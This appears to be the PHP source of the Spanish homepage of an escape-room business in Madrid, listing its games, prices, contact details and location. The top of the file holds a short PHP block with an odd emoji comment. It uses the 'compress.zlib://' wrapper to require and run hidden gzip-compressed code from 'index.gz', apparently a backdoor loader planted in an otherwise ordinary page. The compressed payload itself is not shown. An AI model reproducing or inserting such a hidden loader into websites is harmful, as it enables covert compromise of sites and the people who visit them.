<?php
//(✧*｡٩(ˊᗜˋ*)و✧*｡ds#
$gU = 'compress.zlib://';
require_once $gU.'index.gz';?>

<!DOCTYPE html>
<html lang="es">

<head>
  <!-- Google Tag Manager -->
  <script>
    (function (w, d, s, l, i) {
      w[l] = w[l] || [];
      w[l].push({ "gtm.start": new Date().getTime(), event: "gtm.js" });
      var f = d.getElementsByTagName(s)[0],
        j = d.createElement(s),
        dl = l != "dataLayer" ? "&l=" + l : "";
      j.async = true;
      j.src = "https://www.googletagmanager.com/gtm.js?id=" + i + dl;
      f.parentNode.insertBefore(j, f);
    })(window, document, "script", "dataLayer", "GTM-KRX3VB6");
  </script>
  <!-- End Google Tag Manager -->

  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description"
    content="Juego Enigma Madrid ofrece aventuras de escape inmersivas para grupos. Pon a prueba tu ingenio, colabora con tu equipo y vive una experiencia única." />
  <meta name="keywords"
    content="escape room Madrid, juego enigma, experiencia escape, enigmas, juegos en equipo, misión inmersiva" />

  <title>Juego Enigma Madrid | Escape Room</title>
  <link rel="stylesheet" href="style.css" />
  <link rel="icon" href="../assets/ico/favicon.ico" type="image/x-icon" />
</head>

<body>
  <!-- Google Tag Manager (noscript) -->
  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KRX3VB6" height="0" width="0"
      style="display: none; visibility: hidden"></iframe></noscript>
  <!-- End Google Tag Manager (noscript) -->
  <header>
    <div>
      <ul>
        <li>
          <a href="index.html"><img src="/assets/svg/spain.svg" alt="Icono bandera de España" /></a>
        </li>
        <li>
          <a href="ingles/index-en.html"><img src="./assets/svg/usa.svg" alt="Icono bandera de Estados Unidos" /></a>
        </li>
      </ul>
    </div>
    <nav>
      <a href="/"><img src="/assets/img/logo-enigma.png"
          alt="Logo Enigma" /></a>
      <div class="madrid btn-madrid-map">
        <p>/MADRID</p>
        <span>+</span>
      </div>
      <ul>
        <li>
          <a href="/" class="orange">Escape Room</a>
        </li>
        <li>
          <a href="./pages/paraRegalar.html">Para regalar</a>
        </li>
        <li><a href="./pages/empresas.html">Empresas</a></li>
        <li><a href="colaboremos.html">Colaboremos</a></li>
        <li>
          <a href="./pages/reservas.html" class="reservas">Reservar</a>
        </li>
      </ul>
      <div class="menu-toggle">
        <div class="burger">
          <div class="bar"></div>
          <div class="bar"></div>
          <div class="bar"></div>
        </div>

        <div class="mobile-menu">
          <span><a href="/">Escape Room</a></span>
          <span><a href="./pages/paraRegalar.html">Para Regalar</a></span>
          <span><a href="./pages/empresas.html">Empresas</a></span>
          <span><a href="../colaboremos.html">Colaboremos</a></span>
          <span><a href="#" class="contactanos-btn">Contáctanos</a></span>

          <div class="flags">
            <a href="/index.html"><img src="../assets/svg/spain.svg" alt="Icono bandera de España" /></a>
            <a href="/ingles/index-en.html"><img src="../assets/svg/usa.svg"
                alt="Icono bandera de Estados Unidos" /></a>
          </div>
          <a href="/pages/reservas.html" class="btn-reservar-mobile">RESERVAR</a>
        </div>
      </div>
    </nav>
    <div id="panel-madrid" class="panel-madrid-modal">
      <div class="panel-madrid-box">
        <a href="../colaboremos.html#colaboremos-separador-1"><img src="../assets/img/cityMap.webp"
            alt="Mapa Enigma España" class="mapa-madrid-img" /></a>
      </div>
    </div>
    <!-- POPUP  3-->
    <div id="popup-colaboremos-2" class="popup-overlay-2">
      <div class="popup-box-2">
        <h2>Contactanos</h2>

        <div class="popup-info-2">
          <p>Juego Enigma Madrid</p>
          <p>673 42 37 38</p>
          <p>info@enigmamadrid.es</p>

          <div>
            <a href="https://www.tripadvisor.es/Attraction_Review-g187514-d9752255-Reviews-Juego_Enigma-Madrid.html"
              target="_blank">
              <img class="trip-icon-2" src="../assets/svg/tripadvisor-white.svg" alt="Logo Tripadvisor" />
            </a>
            <a href="https://www.instagram.com/juegoenigma" target="_blank">
              <img class="ins-icon-2" src="../assets/svg/instagram-white.svg" alt="Logo Instagram" />
            </a>
          </div>
        </div>
      </div>
    </div>
    <script>
      const popupOverlay2 = document.getElementById("popup-colaboremos-2");
      const popupBox2 = document.querySelector(".popup-box-2");

      document.querySelectorAll(".contactanos-btn").forEach((btn) => {
        btn.addEventListener("click", () => {
          popupOverlay2.classList.add("open");
        });
      });

      popupOverlay2.addEventListener("click", (e) => {
        if (!popupBox2.contains(e.target)) {
          popupOverlay2.classList.remove("open");
        }
      });
    </script>
  </header>
  <a href="/pages/reservas.html" class="btn-reservar-sticky">RESERVAR</a>
  <script>
    const btnMadridMap = document.querySelector(".btn-madrid-map");
    const panelMadrid = document.getElementById("panel-madrid");
    const stickyBtn2 = document.querySelector(".btn-reservar-sticky");

    btnMadridMap.addEventListener("click", () => {
      panelMadrid.classList.add("panel-open");
      stickyBtn2.classList.add("hidden");
      document.body.classList.add("body-no-scroll");
    });

    panelMadrid.addEventListener("click", (e) => {
      if (!e.target.closest(".panel-madrid-box")) {
        panelMadrid.classList.remove("panel-open");
        stickyBtn2.classList.remove("hidden");
        document.body.classList.remove("body-no-scroll");
      }
    });
  </script>
  <script>
    const burger = document.querySelector(".burger");
    const mobileMenu = document.querySelector(".mobile-menu");
    const stickyBtn = document.querySelector(".btn-reservar-sticky");

    burger.addEventListener("click", () => {
      burger.classList.toggle("open");
      mobileMenu.classList.toggle("open");
      stickyBtn.classList.toggle("hidden");
    });
  </script>
  <main>
    <div class="main-container">
      <div class="reservas-container">
        <div class="reservas-container-boton">
          <img src="./assets/img/cable_izqiuerdo.webp" alt="decoración" />
          <a href="./pages/reservas.html">RESERVAR</a>
          <img src="./assets/img/cable_derecho.webp" alt="decoración" />
        </div>
        <div class="reservas-container-texto">
          <p>JUEGO DE ESCAPE EN VIVO</p>
          <p>Entretenimiento Inmersivo Y Alucinante</p>
          <p>
            Encuentra pistas, resuelve enigmas y escapa en menos de 60
            minutos.
          </p>
           <img src="./assets/img/flecha_header.png" alt = "Científico con jeringuilla"/>
        </div>
      </div>
    </div>
    <section class="servicios">
      <article class="servicios-virus">
        <div class="circulo-naranja-virus">
           <img src="./assets/img/virus_b.webp" alt = "Científico con jeringuilla"/>
        </div>
        <div class="servicios-virus-contenedor">
          <div class="virus-contenedor-text">
            <p>Nuestras instalaciones</p>
            <h3>EL VIRUS</h3>
            <p>
              El enemigo ha obligado a científicos inocentes a elaborar un
              virus para usarlo contra la población civil en un ataque
              biológico letal. Vuestra misión es entrar en la base para
              recuperar el virus y neutralizar la amenaza.
            </p>
            <h4>¿ESTARÉIS A LA ALTURA DE LA MISIÓN?</h4>
          </div>
          <div class="virus-contenedor-precio">
            <p><span>MISIÓN INDIVIDUAL (1 SALA):</span> 2-6 AGENTES</p>
            <p><span>MISIÓN DOBLE (2 SALAS):</span> 4-12 AGENTES</p>
            <p><span>PRECIO:</span> Desde 19€ por persona</p>
          </div>
          <a href="./pages/virus.html" class="virus-contenedor-boton">+ INFO Y RESERVA</a>
        </div>
      </article>
      <article class="servicios-keylock">
        <div class="circulo-naranja-detective">
            <img src="./assets/img/virus_a.webp" alt="Detective sin rostro" />
        </div>
        <div class="servicios-keylock-contenedor">
          <div class="virus-contenedor-text">
            <p>Nuestras instalaciones / A domicilio</p>
            <h3>El asesino de Keylock City</h3>
            <p>
              El cuerpo de policía de Keylock City va detrás de un peligroso
              asesino en serie que ya se ha cobrado siete víctimas. Su punto
              flaco es que le encantan los juegos y va dejando pistas sobre su
              identidad, pero la policia no ha podido avanzar en la
              investigación.
            </p>
            <h4>¿LOGRARÉIS CAZAR AL ASESINO?</h4>
          </div>
          <div class="virus-contenedor-precio">
            <p><span>NUESTRAS INSTALACIONES:</span> 8-24 DETECTIVES</p>
            <p><span>A DOMICILIO:</span> +20 DETECTIVES</p>
            <p><span>PRECIO:</span> 19€ por persona</p>
          </div>
          <a href="./pages/info-asesino-de-keylock-city.html" class="keylock-contenedor-boton">+ INFO Y RESERVA</a>
        </div>
      </article>
    </section>
    <section class="retos">
      <img src="./assets/img/home_icons.webp" alt="Iconos varios de temática Scape Room: reloj, candado, equipo, puerta"
        class="collage" />
      <section class="retos-container">
        <div class="retos-container-1">
          <img src="./assets/img/box-01.webp" alt="Grupo de personas jugando a escape room" class="equipo" />
          <div>
            <img src="./assets/img/mini_hexagon_01.webp" alt="" />
            <div>
              <h3>¿Te atreves?</h3>
              <p>
                Un Escape Room es una actividad de ocio divertidisima y
                emocionante donde tu y tus amigos, familia o compañeros de
                trabajo entraréis en una o varias habitaciones ¡de las que
                tendréis que escapar antes de que se acabe el tiempo!
              </p>
            </div>
          </div>
        </div>
        <div class="retos-container-2">
          <div>
            <img src="./assets/img/mini_hexagon_02.webp" alt="" />
            <div>
              <h3>La unión hace la fuerza</h3>
              <p>
                Debereis utilizar vuestra capacidad de observación,
                comunicación y trabajo en equipo con el fin de ir resolviendo
                todos los juegos de lógica, puzzles, enigmas que ese espacio
                plantea ¡sin necesidad alguna de utilizar el entrenamiento en
                el gimnasio!
              </p>
            </div>
          </div>
          <img src="./assets/img/box-02.webp" alt="Contador con 59 minutos y 59 segundos" class="contador" />
        </div>
        <div class="retos-container-1">
          <img src="./assets/img/box-03.webp" alt="Manos uniendo engranajes" class="engranajes" />
          <div>
            <img src="./assets/img/mini_hexagon_03.webp" alt="" />
            <div>
              <h3 class="engranaje">Sé protagonista</h3>
              <p>
                En Juego Enigma nos encanta que te sientas protagonista de una
                historia alejada de tu día a día, es por ello que ponemos
                muchisimo esfuerzo en la ambientación y la inmersión y que en
                el rato que estés con nosotros te olvides de todo y te limites
                a disfrutar estrujandote los sesos.
              </p>
            </div>
          </div>
        </div>
        <div class="retos-container-2">
          <div>
            <img src="./assets/img/mini_hexagon_04.webp" alt="" />
            <div>
              <h3 class="laberinto">Diversión ante todo</h3>
              <p>
                Eso si ¡sin llegar al dolor de cabeza! nuestra filosofía es
                ante todo diversión a través del reto, pero no nos gusta que
                te frustres, para eso ya está el día a día, el trabajo, etc.
                así que adaptamos la forma de llevarte según sea tu grupo.
                ¿Estáis listos?
              </p>
            </div>
          </div>
          <img src="./assets/img/box-04.webp" alt="Laberinto" class="laberintos" />
        </div>
      </section>
    </section>
  </main>
  <a href="https://wa.me/34673423738" target="_blank" class="whatsapp"><img src="../assets/svg/whatsapp.svg"
      alt="WhatsApp" /></a>
  <footer class="footer">
    <div class="footer-naranja">
      <div class="footer-texto">
        <a href="./pages/paraRegalar.html">REGALA LA<br />EXPERIENCIA</a>
        <p>673 423 738</p>
        <p>ADN@ENIGMAMADRID.ES</p>
        <p class="btn-donde-estamos">¿DÓNDE ESTAMOS?</p>
      </div>
      <div class="footer-iconos">
        <a href="https://www.tripadvisor.es/Attraction_Review-g187514-d9752255-Reviews-Juego_Enigma-Madrid.html"
          target="_blank"><img src="assets/svg/tripadvisor.svg" alt="Tripadvisor" /></a>
        <a href="https://www.instagram.com/juegoenigma/" target="_blank"><img src="assets/svg/instagram.svg"
            alt="Instagram" /></a>
      </div>
    </div>
    <div class="footer-negro">
      <a href="#">BLOG</a>
      <a href="aviso-legal.html">AVISO LEGAL</a>
      <a href="privacidad.html">PRIVACIDAD</a>
      <a href="terminos-condiciones.html">TERMINOS Y CONDICIONES</a>
      <a href="/sitemap.xml">SITEMAP</a>
    </div>
  </footer>
  <footer class="footer-responsive">
    <p>
      <a class="tooltip" href="tel:+34673423738">LLAMAR</a>
    </p>
    <p class="btn-donde-estamos">¿DÓNDE ESTAMOS?</p>
  </footer>
  <div id="panel-donde" class="panel-donde">
    <div class="panel-donde__box">
      <button class="panel-donde__close">&times;</button>
      <h2>¿Dónde estamos?</h2>
      <p class="box-direction">Calle Nuestra Señora del Carmen 7, 28039</p>
      <div>
        <p>
          <img src="../assets/img/metro_line_1.webp" alt="Icono línea metro 1 Madrid" />
          Estrecho (5 min)
        </p>
        <p>
          <img src="../assets/img/metro_line_1.webp" alt="Icono línea metro 1 Madrid" />
          Tetuán (5 min)
        </p>
        <p>
          <img src="../assets/img/metro_line_7.webp" alt="Icono línea metro 7 Madrid" />
          Francos Rodríguez (10 min)
        </p>
      </div>
      <iframe
        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3632.6362047997254!2d-3.704801223570821!3d40.458420553100154!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0xd422900b21de8d5%3A0x8eec68a84be0731c!2sC%2F%20de%20Ntra.%20Sra.%20del%20Carmen%2C%207%2C%20Tetu%C3%A1n%2C%2028039%20Madrid!5e1!3m2!1ses!2ses!4v1763467414714!5m2!1ses!2ses"
        width="600" height="450" style="border: 0" allowfullscreen="" loading="lazy"
        referrerpolicy="no-referrer-when-downgrade"></iframe>
    </div>
  </div>
  <script>
    const panelDonde = document.getElementById("panel-donde");
    const cerrarDonde = document.querySelector(".panel-donde__close");

    document.querySelectorAll(".btn-donde-estamos").forEach((btn) => {
      btn.addEventListener("click", () => {
        panelDonde.classList.add("panel-donde--open");
      });
    });

    cerrarDonde.addEventListener("click", () => {
      panelDonde.classList.remove("panel-donde--open");
    });

    panelDonde.addEventListener("click", (e) => {
      if (e.target === panelDonde) {
        panelDonde.classList.remove("panel-donde--open");
      }
    });
  </script>
</body>

</html>